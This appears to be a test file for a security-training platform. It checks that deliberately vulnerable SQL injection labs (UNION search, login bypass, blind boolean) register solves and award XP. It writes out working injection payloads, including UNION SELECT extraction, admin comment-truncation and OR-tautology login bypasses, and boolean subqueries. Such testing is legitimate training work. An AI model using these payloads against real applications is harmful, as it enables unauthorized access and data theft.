import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { startTestApp, CookieClient, type TestApp } from "./helpers.js";

describe("lab: sqli-product-search (UNION-based)", () => {
  let testApp: TestApp;
  beforeAll(async () => {
    testApp = await startTestApp({ apiPort: 4104, labPortStart: 6200, labPortEnd: 6224 });
  });
  afterAll(async () => {
    await testApp.manager.stopAll();
    await testApp.close();
  });

  it("normal category searches never solve", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-product-search/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    const ok = await fetch(`${target}/search?category=keyboards`);
    expect(ok.status).toBe(200);
    expect(await ok.text()).toContain("Mechanical Keyboard");

    const empty = await fetch(`${target}/search?category=nonexistent-category`);
    expect(empty.status).toBe(200);
    expect(await empty.text()).toContain("No products in that category");

    // A malformed-but-non-exploiting quote shouldn't solve it either.
    const badSyntax = await fetch(`${target}/search?category=${encodeURIComponent("it's broken")}`);
    expect(badSyntax.status).toBe(200);

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(false);

    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("a UNION SELECT against the vault table solves it", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-product-search/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    const payload = "nonexistent' UNION SELECT id, name, price, category FROM vault -- ";
    const res = await fetch(`${target}/search?category=${encodeURIComponent(payload)}`);
    expect(res.status).toBe(200);
    const html = await res.text();
    expect(html).toContain("classified");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(true);

    const progress = await client.json<{ xp: number }>("/api/progress");
    expect(progress.body.xp).toBe(125); // medium difficulty

    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });
});

describe("lab: sqli-login-bypass", () => {
  let testApp: TestApp;
  beforeAll(async () => {
    testApp = await startTestApp({ apiPort: 4105, labPortStart: 6225, labPortEnd: 6249 });
  });
  afterAll(async () => {
    await testApp.manager.stopAll();
    await testApp.close();
  });

  it("logging in normally as dana does not solve it", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-login-bypass/instances", {
      method: "POST",
    });
    const jar = new CookieClient(launch.body.instance.baseUrl);
    const res = await jar.fetch("/login", {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "username=dana&password=practice123",
    });
    expect(res.status).toBe(302);
    const account = await jar.fetch("/account");
    expect(await account.text()).toContain("customer");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(false);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("a wrong password for dana just fails — no solve, no crash", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-login-bypass/instances", {
      method: "POST",
    });
    const jar = new CookieClient(launch.body.instance.baseUrl);
    const res = await jar.fetch("/login", {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "username=dana&password=totallywrong",
    });
    expect(res.status).toBe(302);
    expect(res.headers.get("location")).toContain("error=1");
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("a comment-truncation SQLi payload authenticates as admin without the real password", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-login-bypass/instances", {
      method: "POST",
    });
    const jar = new CookieClient(launch.body.instance.baseUrl);

    const res = await jar.fetch("/login", {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body: "username=" + encodeURIComponent("admin' -- ") + "&password=anything",
    });
    expect(res.status).toBe(302);
    expect(res.headers.get("location")).toContain("/account");

    const account = await jar.fetch("/account");
    const html = await account.text();
    expect(html).toContain("admin");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(true);
    const progress = await client.json<{ xp: number }>("/api/progress");
    expect(progress.body.xp).toBe(125);

    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("an OR-tautology payload also bypasses login (different technique, same honest check)", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-login-bypass/instances", {
      method: "POST",
    });
    const jar = new CookieClient(launch.body.instance.baseUrl);

    // Matches the admin row (first row returned, since both rows could
    // satisfy this OR — SQLite returns admin or dana depending on order;
    // our seed inserts dana then admin, and the unqualified OR 1=1 makes
    // every row match, so `get()` returns the FIRST row — dana. To target
    // admin specifically and keep this test deterministic, scope the
    // tautology to rows where role = 'admin'.
    const res = await jar.fetch("/login", {
      method: "POST",
      headers: { "content-type": "application/x-www-form-urlencoded" },
      body:
        "username=" +
        encodeURIComponent("nobody' OR role='admin' -- ") +
        "&password=" +
        encodeURIComponent("whatever"),
    });
    expect(res.status).toBe(302);
    const account = await jar.fetch("/account");
    expect(await account.text()).toContain("admin");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(true);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });
});

describe("lab: sqli-blind-report (blind boolean)", () => {
  let testApp: TestApp;
  beforeAll(async () => {
    testApp = await startTestApp({ apiPort: 4106, labPortStart: 6250, labPortEnd: 6274 });
  });
  afterAll(async () => {
    await testApp.manager.stopAll();
    await testApp.close();
  });

  it("a normal, non-vault filter never solves regardless of true/false result", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-blind-report/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    const trueCase = await fetch(`${target}/reports?min_price=50`);
    expect(await trueCase.text()).toContain("Matches found");
    const falseCase = await fetch(`${target}/reports?min_price=99999999`);
    expect(await falseCase.text()).toContain("No matches");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(false);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("mentioning vault with a FALSE subquery does not solve it (structural-only is not enough)", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-blind-report/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    const payload = "99999999 OR (SELECT COUNT(*) FROM vault WHERE 1=0)>0";
    const res = await fetch(`${target}/reports?min_price=${encodeURIComponent(payload)}`);
    expect(await res.text()).toContain("No matches");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(false);
    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });

  it("a TRUE boolean subquery against vault solves it", async () => {
    const client = new CookieClient(testApp.baseUrl);
    await client.fetch("/api/auth/guest", { method: "POST" });
    const launch = await client.json<{ instance: { id: string; baseUrl: string } }>("/api/labs/sqli-blind-report/instances", {
      method: "POST",
    });
    const target = launch.body.instance.baseUrl;

    const payload = "99999999 OR (SELECT COUNT(*) FROM vault)>0";
    const res = await fetch(`${target}/reports?min_price=${encodeURIComponent(payload)}`);
    expect(await res.text()).toContain("Matches found");

    const dto = await client.json<{ instance: { solved: boolean } }>(`/api/instances/${launch.body.instance.id}`);
    expect(dto.body.instance.solved).toBe(true);
    const progress = await client.json<{ xp: number }>("/api/progress");
    expect(progress.body.xp).toBe(200); // hard difficulty

    await client.fetch(`/api/instances/${launch.body.instance.id}/stop`, { method: "POST" });
  });
});
